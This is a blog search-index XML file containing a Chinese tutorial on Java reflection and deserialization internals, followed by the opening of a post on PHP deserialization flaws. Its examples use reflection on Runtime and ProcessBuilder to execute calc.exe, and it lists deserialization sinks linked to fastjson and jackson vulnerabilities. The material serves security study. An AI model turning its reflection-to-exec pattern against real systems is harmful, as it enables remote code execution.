<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java反序列化基础</title>
    <url>/2023/03/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h2 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h2><ol>
<li><p><strong><code>forName</code>方法</strong><br> 用法：<code>Class.forName(String className)</code></p>
</li>
<li><p><strong><code>类名.class</code></strong></p>
<p> 用法：<code>className.class</code> </p>
</li>
<li><p><strong><code>getClass</code>方法</strong><br> 用法：<code>Object.getClass()</code> </p>
</li>
<li><p>其中<code>Object</code>应为上下文中已经实例化的类的对象。</p>
</li>
<li><p><strong><code>classLoader.loadClass</code>方法</strong></p>
<p> 用法：<code>classLoader.loadClass(className)</code></p>
<p> 此处需要注意的是获取数组类型的Class对象需要使用Java类型的描述符方式，例如：</p>
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; doubleArray = Class.forName(<span class="string">&quot;[D&quot;</span>);						<span class="comment">//相当于double[].class</span></span><br><span class="line">Class&lt;?&gt; cStringArray = Class.forName(<span class="string">&quot;[[Ljava.lang.String;&quot;</span>);	<span class="comment">// 相当于String[][].class</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
<p><strong>补充-获取内部类时需要将<code>.</code>替换为<code>$</code>，如<code>com.security.Test1$Test2</code></strong></p>
<h2 id="创建类实例"><a href="#创建类实例" class="headerlink" title="创建类实例"></a>创建类实例</h2><h3 id="获取类的构造函数"><a href="#获取类的构造函数" class="headerlink" title="获取类的构造函数"></a>获取类的构造函数</h3><p>在Java的<strong>任何一个类都必须有一个或多个构造方法</strong>，如果代码中没有创建构造方法，那么在类编译的时候会自动创建一个无参数的构造方法。</p>
<ol>
<li><p><strong><code>Class&lt;?&gt;.getConstructor</code></strong></p>
<p> 用法：<code>Contstuctor c = Class&lt;?&gt;.getConstructor(参数列表类型)</code></p>
<p> 获取类中<code>Public</code>属性的指定构造方法。例如：</p>
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"><span class="comment">// 指定获取参数列表为String[].class的构造方法</span></span><br><span class="line">clazz.getConstructor(String[].class);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Class&lt;?&gt;.getDeclaredConstructor</code></strong></p>
<p> 用法：<code>Contstuctor c = Class&lt;?&gt;.getDeclaredConstructor(参数列表类型)</code></p>
<p> 获取类中“声明”的指定构造方法，<strong>包括私有构造方法</strong>。</p>
<p> 需要注意的是，<strong>当调用私有构造方法的时候需要使用<code>setAccessible</code>来修改其作用域</strong>，例如：</p>
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">// 获取Runtime的私有无参构造方法</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">c</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line"><span class="comment">// 由于是私有构造方法，需要使用setAccessible修改其作用域</span></span><br><span class="line">c.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Class&lt;?&gt;.getConstructors</code></strong></p>
<p> 用法：<code>Contstuctor[] c = Class&lt;?&gt;.getDeclaredConstructors()</code></p>
<p> 获取类中所有的<strong>公有</strong>构造函数，返回一个构造函数列表。</p>
</li>
<li><p><strong><code>Class&lt;?&gt;.getDeclaredConstructors</code></strong></p>
<p> 用法：<code>Contstuctor[] c = Class&lt;?&gt;.getDeclaredConstructors()</code></p>
<p> 获取类中所有的构造函数，返回一个构造函数列表。</p>
</li>
</ol>
<h3 id="创建类的实例化对象"><a href="#创建类的实例化对象" class="headerlink" title="创建类的实例化对象"></a>创建类的实例化对象</h3><ol>
<li><p><strong><code>newInstance</code>方法</strong><br> 用法：<code>Class&lt;?&gt;.newInstance()</code>，返回<code>Object</code>类型，即返回<code>Class&lt;?&gt;</code>的一个对象<br> 实质上这个方法的作用是<strong>调用这个类的无参构造函数</strong>，当这个类<strong>没有无参构造方法</strong>或者<strong>无参构造方法为私有属性</strong>的时候，无法直接通过<code>newInstance</code>来获得这个类的对象，这种情况下就需要先获取到指定的构造函数后再调用<code>newInstance</code>方法来获取实例化对象。例如以下三个例子：</p>
<ul>
<li>无参构造方法</li>
</ul>
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.security.example&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.newInstance()</span><br></pre></td></tr></table></figure></div>

<ul>
<li>指定参数列表类型构造方法</li>
</ul>
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"><span class="comment">// 获取ProcessBuilder类中参数列表类型为List的构造方法</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">c</span> <span class="operator">=</span> clazz.getConstructor(List.class);</span><br><span class="line"><span class="comment">// 调用ProcessBuilder类中参数列表类型为List的构造方法获取ProcessBuilder类实例</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c.newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>));</span><br></pre></td></tr></table></figure></div>

<ul>
<li>私有无参构造函数</li>
</ul>
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">// 获取Runtime的私有无参构造方法</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">c</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line"><span class="comment">// 由于是私有构造方法，需要使用setAccessible修改其作用域</span></span><br><span class="line">c.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 调用Runtime类私有无参构造方法获取Runtime类实例</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c.newInstance()</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h2 id="获取-调用类方法"><a href="#获取-调用类方法" class="headerlink" title="获取&#x2F;调用类方法"></a>获取&#x2F;调用类方法</h2><h3 id="获取类中函数"><a href="#获取类中函数" class="headerlink" title="获取类中函数"></a>获取类中函数</h3><ol>
<li><p><strong><code>getMethod</code>方法</strong><br> 用法：<code>Method m = Class&lt;?&gt;.getMethod(String name, class&lt;?&gt;...parameterType)</code><br> 第一个参数代表<strong>方法名</strong>，第二个参数表示<strong>该方法参数类型（可缺省）</strong>，不过Java中支持类的重载，一个同名函数往往会由于参数列表的不同而具有不同的效果，因而无法仅通过一个函数名来确定一个函数，因此第二个参数也会用来获取指定的一个方法。此方法仅能获取到Public属性或从父类继承的方法。</p>
</li>
<li><p><strong><code>getDeclaredMethod</code>方法</strong></p>
<p> 用法：<code>Method m = Class&lt;?&gt;.getDeclaredMethod(String name, class&lt;?&gt;...parameterType)</code></p>
<p> 该方法与<code>getDeclaredConstructor</code>方法类似，可以获取到私有属性的方法，在使用<code>invoke</code>调用私有方法前同样需要使用<code>setAccessible</code>方法修改其作用域。</p>
</li>
<li><p><strong><code>getMethods</code>方法</strong></p>
<p> 用法：<code>Method[] m = Class&lt;?&gt;.getMethods()</code></p>
<p> 获得该类所有<strong>公有</strong>方法，返回一个<code>Method[]</code>类型的方法列表。</p>
</li>
<li><p><strong><code>getDeclaredMethods</code>方法</strong></p>
<p> 用法：<code>Method[] m = Class&lt;?&gt;.getDeclaredMethods()</code></p>
<p> 获得该类所有方法，返回一个<code>Method[]</code>类型的方法列表。。</p>
</li>
</ol>
<h3 id="调用类中函数"><a href="#调用类中函数" class="headerlink" title="调用类中函数"></a>调用类中函数</h3><ol>
<li><p><strong><code>invoke</code>方法</strong><br> 用法：<code>Method.invoke(Object obj, Object ... args)</code></p>
<p> 这个方法一般要与<code>getMethod</code>结合使用，一般是先用前者获取到一个<code>Method</code>类，再用<code>invoke</code>调用。</p>
<p> 当调用的是一个<strong>普通方法</strong>时，第一个参数代表<strong>类的一个对象</strong>；</p>
<p> 当调用的是一个<strong>静态方法</strong>时，第一个参数代表<strong>类</strong>，第二个参数代表<strong>方法的参数</strong>。</p>
<p> 可以这么理解：正常执行一个方法时，我们通过<code>A.method(B,C,D,...)</code>来执行；在反射中，我们则是通过<code>method.invoke(A,B,C,D,...)</code>去执行，普通方法的<code>A</code>需要时该类的一个对象，而静态方法的<code>A</code>则是类。</p>
<p> 例如：</p>
<ul>
<li><p>普通方法（以<code>ProcessBuilder.start</code>为例）：</p>
  <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"><span class="comment">// 获取ProcessBuilder类中参数列表类型为List的构造方法</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">c</span> <span class="operator">=</span> clazz.getConstructor(List.class);</span><br><span class="line"><span class="comment">// 获取ProcessBuilder类实例</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c.newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>));</span><br><span class="line"><span class="comment">// 获取ProcessBuilder类start方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">myStart</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"><span class="comment">// 调用ProcessBuilder类中的start方法</span></span><br><span class="line">myStart.invoke(obj);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>静态方法（以<code>Runtime.getRuntime</code>为例）：</p>
  <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">// 获取Runtime类getRuntime方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">myGetRuntime</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="comment">// 调用Runtime类getRuntime方法</span></span><br><span class="line">myGetRuntime.invoke(clazz);</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ol>
<h2 id="获取-设置成员变量"><a href="#获取-设置成员变量" class="headerlink" title="获取&#x2F;设置成员变量"></a>获取&#x2F;设置成员变量</h2><h3 id="获取成员变量"><a href="#获取成员变量" class="headerlink" title="获取成员变量"></a>获取成员变量</h3><ol>
<li><p><strong><code>getField</code>方法</strong></p>
</li>
<li><p><strong><code>getDeclaredField</code>方法</strong></p>
</li>
</ol>
<h3 id="获取-设置成员变量的值"><a href="#获取-设置成员变量的值" class="headerlink" title="获取&#x2F;设置成员变量的值"></a>获取&#x2F;设置成员变量的值</h3><ol>
<li><p><strong><code>get</code>方法</strong></p>
</li>
<li><p><strong><code>set</code>方法</strong></p>
</li>
</ol>
<h2 id="例子：Runtime类"><a href="#例子：Runtime类" class="headerlink" title="例子：Runtime类"></a>例子：Runtime类</h2><p><code>Runtime</code>类是我们在Java安全中较为常见用于实现RCE的一个类，那么如何通过这个类来执行命令呢？刚才提到过<code>java.lang.Runtime</code>类的无参构造方法是私有的，我们无法通过<code>newInstance</code>来获取<code>Runtime</code>类的对象。<br>之所以要将类的某个构造方法设置为私有的，这是由于<strong>单例模式</strong>的开发模式，通俗地来解释就是在某个类的构造函数只需要实例化调用一次时会如此设计，<strong>后续如果需要调用这个类的对象则需要通过调用这个类的某个特定静态方法来获得</strong>，这样的设计可以避免某个类的构造函数被多次重复的调用，最典型的例子就是创建数据库连接。<br>那么<code>Runtime</code>所提供的静态方法就是<code>getRuntime</code>，通过调用<code>getRuntime</code>我们可以获取到<code>Runtime</code>类的一个对象。</p>
<p>例如：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        <span class="comment">// 等价于 Runtime myRuntime = Runtime.getRuntime();</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">myRuntime</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke();</span><br><span class="line">        <span class="comment">// 等价于 myRuntime.exec(&quot;open /System/Applications/Calculator.app&quot;);</span></span><br><span class="line">        <span class="comment">// Runtime的exec方法有6个重载，这里的getMethod方法的第二个参数指定了获取参数为String的exec方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        exec.invoke(myRuntime,<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><p><strong>序列化</strong>：使用<code>ObjectOutputStream</code>类的<code>writeObject</code>函数</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(Object x)</span> <span class="keyword">throws</span> IOException</span><br></pre></td></tr></table></figure></div>

<p><strong>反序列化</strong>：使用<code>ObjectInputStream</code>类的<code>readObject</code>函数</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br></pre></td></tr></table></figure></div>

<p>支持序列化的对象必须满足：</p>
<ol>
<li>实现了<code>java.io.Serializable</code>接口</li>
<li>当前对象的所有类属性可序列化，如果有一个属性不想或不能被序列化，则需要指定<code>transient</code>，使得该属性将不会被序列化</li>
</ol>
<p>DOME：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Employee</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="comment">// number成员声明了transient属性无法反序列化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">int</span> number;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">(String name, String address, <span class="type">int</span> number)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">        <span class="built_in">this</span>.number = number;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">info</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I am &quot;</span> + name);</span><br><span class="line">        System.out.println(<span class="string">&quot;Number is &quot;</span> + number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Override readObject</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 调用默认的readObject方法，使其能正常反序列化</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">// 重载的readObject方法多了一行输出</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Employee call readObject Function&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Employee</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="string">&quot;Reyan Ali&quot;</span>,<span class="string">&quot;Phokka Kuan, Ambehta Peer&quot;</span>,<span class="number">123</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Serialize</span></span><br><span class="line">        <span class="comment">// 创建一个文件输出流 -&gt; 用于写入文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./employee.ser&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建一个对象输出流 并且输出定向到文件中</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line">        <span class="comment">// writeObject 序列化</span></span><br><span class="line">        out.writeObject(e);</span><br><span class="line">        out.close();</span><br><span class="line">        fileOut.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;Serialized&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Deserialize</span></span><br><span class="line">        <span class="comment">// 创建文件输入流 -&gt; 用于读取文件</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./employee.ser&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建一个对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line">        <span class="comment">// readObject 反序列化</span></span><br><span class="line">        <span class="type">Employee</span> <span class="variable">obj</span> <span class="operator">=</span> (Employee) in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        fileIn.close();</span><br><span class="line">        obj.info();</span><br><span class="line">        System.out.println(<span class="string">&quot;Deserialized&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span>(IOException i) &#123;</span><br><span class="line">        i.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230130204141460.png"
                      alt="image-20230130204141460"
                ></p>
<p><code>Number</code>成员由于声明了<code>transient</code>属性没有反序列化，所以这里输出的值为<code>0</code></p>
<h2 id="反序列化触发点"><a href="#反序列化触发点" class="headerlink" title="反序列化触发点"></a>反序列化触发点</h2><p>除了常见的<code>ObjectInputStream.readObject</code>可以触发反序列化操作外，还有以下几种触发方式：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject		<span class="comment">// 流转化为Object</span></span><br><span class="line">ObjectInputStream.readUnshared 		<span class="comment">// 流转化为Object</span></span><br><span class="line">XMLDecoder.readObject 				<span class="comment">// 读取xml转化为Object -&gt; XML反序列化</span></span><br><span class="line">Yaml.load							<span class="comment">// yaml字符串转Object-&gt; yaml反序列化</span></span><br><span class="line">XStream.fromXML						<span class="comment">// XStream用于Java Object与xml相互转化</span></span><br><span class="line">ObjectMapper.readValue				<span class="comment">// jackson中的api 	-&gt; jackson反序列化漏洞</span></span><br><span class="line">JSON.parseObject					<span class="comment">// fastjson中的api	-&gt; fastjson反序列化漏洞</span></span><br></pre></td></tr></table></figure></div>

<p><code>readUnshared</code>方法读取对象，不允许后续的<code>readObject</code>和<code>readUnshared</code>调用引用这次调用反序列化得到的对象，而<code>readObject</code>读取的对象可以。</p>
<h2 id="反序列化过程分析"><a href="#反序列化过程分析" class="headerlink" title="反序列化过程分析"></a>反序列化过程分析</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>反序列化的过程主要分为两步：</p>
<ol>
<li>读取序列化字节流，根据序列化规格提取对应的类</li>
<li>利用反射实例化获得对象</li>
</ol>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>跟进<code>ObjectInputStream.readObject</code>方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230130211852595.png"
                      alt="image-20230130211852595"
                ></p>
<p>跟进readObject方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230130212010365.png"
                      alt="image-20230130212010365"
                ></p>
<p>主要的反序列化代码是调用的<code>readObject0</code>方法：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> readObject0(type, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure></div>

<p>在<code>readObject0</code>里有一个<code>switch</code>判断：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230130212421942.png"
                      alt="image-20230130212421942"
                ></p>
<p>这里的<code>115</code>所指向的是<code>TC_OBJECT</code>，代表反序列化的对象是一个<code>Object</code>：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230130213053495.png"
                      alt="image-20230130213053495"
                ></p>
<p>跟进<code>readOrdinaryObject</code>：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230130214019300.png"
                      alt="image-20230130214019300"
                ></p>
<p>这里的<code>readClassDesc(false)</code>作用是从序列化流中提取出相关的类信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230130214508184.png"
                      alt="image-20230130214508184"
                ></p>
<p>跟进这里的<code>readNonProxyDesc()</code>方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230130214604919.png"
                      alt="image-20230130214604919"
                ></p>
<p>这里的关键点在于<code>resolveClass()</code>方法，这个方法实现了利用反射机制获取到类的Class对象：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230130214701690.png"
                      alt="image-20230130214701690"
                ></p>
<p>注意这里利用反射中的getName<code>和</code>forName&#96;最终获取到了类的Class对象：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230130214137398.png"
                      alt="image-20230130214137398"
                ></p>
<p>此处整一个反射就是先通过<code>Class.forName</code>获取到当前描述器所指代的类的Class对象，后续会在<code>initNonProxy</code>或<code>initProxy</code>函数中复制该Class对象的相关信息(包括相关函数)，最后在2044行处<code>ObjectStreamClass.newInstance</code>实例化该对象：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230130213134883.png"
                      alt="image-20230130213134883"
                ></p>
<p>获得对象之后会在2213行的<code>readSerialData()</code>函数将序列化流中的相关数据填充进实例化后的对象中或调用当前类描述器的readObject函数：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230131090855974.png"
                      alt="image-20230131090855974"
                ></p>
<p><code>readSerialData()</code>具体实现如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230131091855636.png"
                      alt="image-20230131091855636"
                ></p>
<p>这里的<code>hasReadObjectMethod</code>用于判断该类是否有自己的<code>readObject</code>方法。</p>
<p>然后可以跟进<code>invokeReadObject</code>方法，更深入的看到是如何设置对象的字段值的，这里忽略掉中间调用，最终是在<code>defaultReadFields</code>中的<code>setObjFieldValues</code>方法实现的：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230131092026261.png"
                      alt="image-20230131092026261"
                ></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>Java程序中类<code>ObjectInputStream</code>的<code>readObject</code>方法被用来将数据流反序列化为对象，如果流中的对象是<code>class</code>，则它的<code>ObjectStreamClass</code>描述符会被读取，并返回相应的class对象，<code>ObjectStreamClass</code>包含了类的名称及<code>serialVersionUID</code>。</p>
<p>如果类描述符是动态代理类，则调用<code>resolveProxyClass</code>方法来获取本地类。如果不是动态代理类则调用<code>resolveClass</code>方法来获取本地类。如果无法解析该类，则抛出<code>ClassNotFoundException</code>异常。</p>
<p>如果反序列化对象不是String、array、enum类型，<code>ObjectStreamClass</code>包含的类会在本地被检索，如果这个本地类没有实现<code>java.io.Serializable</code>或者<code>externalizable</code>接口，则抛出<code>InvalidClassException</code>异常。因为只有实现了<code>Serializable</code>或<code>Externalizable</code>接口的类的对象才能被序列化。</p>
<p>前面分析中提到最后会调用<code>resolveClass</code>获取类的Class对象，这是反序列化过程中一个重要的地方，也是必经之路，所以有研究人员提出通过重载<code>ObjectInputStream</code>的<code>resolveClass</code>来限制可以被反序列化的类。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
<li><p><a class="link"   href="https://www.javasec.org/" >https://www.javasec.org/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p>JAVA安全漫谈@phith0n <a class="link"   href="https://github.com/phith0n/JavaThings" >https://github.com/phith0n/JavaThings<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><a class="link"   href="https://websec.readthedocs.io/zh/latest/language/java/basic.html" >https://websec.readthedocs.io/zh/latest/language/java/basic.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li></li>
</ul>
]]></content>
      <tags>
        <tag>JAVA反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化漏洞总结</title>
    <url>/2023/03/11/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>开发者为了以某种存储形式使自定义对象持久化同时实现将对象从一个地方传递到另一个地方通常会在程序中引入序列化和反序列化两种操作。</p>
